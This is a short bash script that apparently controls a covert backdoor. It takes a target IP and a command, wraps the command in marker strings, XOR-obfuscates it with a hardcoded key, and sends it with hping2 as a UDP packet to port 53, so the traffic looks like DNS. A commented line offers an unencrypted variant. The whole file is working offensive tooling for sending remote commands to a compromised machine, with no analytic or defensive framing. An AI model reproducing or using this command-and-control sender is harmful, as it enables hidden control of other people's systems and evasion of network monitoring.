#!/bin/bash
PASS=987
OPTS="-c 1 -2 -E /dev/stdin -d 100 -p 53 "
COM_START="start["
COM_END="]end"
if [ -z "$1" ]
then
echo "$0 <ip> <command>"
exit 0
fi
if [ -z "$2" ]
then
echo "$0 <ip> <command>"
exit 0
fi
echo "$COM_START$2$COM_END $PASS to hping $OPTS $1"

#Comment out top uncomment bottom to send unencrypted, vice versa encrypted
./xor_string "$COM_START$2$COM_END" $PASS | hping2 $OPTS $1
#echo $PASS$COM_START$2$COM_END | hping2 $OPTS $1
